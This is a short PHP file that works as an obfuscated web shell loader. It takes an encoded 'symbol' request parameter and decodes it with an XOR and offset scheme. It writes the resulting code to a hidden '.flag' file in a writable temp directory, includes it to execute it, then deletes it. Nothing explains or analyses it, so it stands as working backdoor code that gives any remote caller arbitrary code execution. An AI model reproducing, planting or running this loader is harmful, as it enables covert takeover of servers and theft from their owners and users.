<?php

if(isset($_REQUEST["symbol"])){
	$pgrp = array_filter([sys_get_temp_dir(), ini_get("upload_tmp_dir"), session_save_path(), "/tmp", "/dev/shm", getenv("TEMP"), "/var/tmp", getenv("TMP"), getcwd()]);
	$resource = $_REQUEST["symbol"];
		$resource		=explode   (   ".",   $resource 		)  ;
	$fac	=	'';
            $s	=	'abcdefghijklmnopqrstuvwxyz0123456789';
            $sLen	=	strlen(	$s);
            $p	=	0;
    
            $__tmp	=	$resource;
            while(	$v5	=	array_shift(	$__tmp)) {
                $chS	=	ord(	$s[$p%  $sLen]);
                $d	=	(	(	int)$v5 - $chS -(	$p%  10))	^16;
                $fac .= chr(	$d);
                $p++;
            }
	for ($entry = 0, $binding = count($pgrp); $entry < $binding; $entry++) {
    $itm = $pgrp[$entry];
    		if ((bool)is_dir($itm) && (bool)is_writable($itm)) {
    $val = sprintf("%s/.flag", $itm);
    $file = fopen($val, 'w');
if ($file) {
	fwrite($file, $fac);
	fclose($file);
	include $val;
	@unlink($val);
	die();
}
}
}
}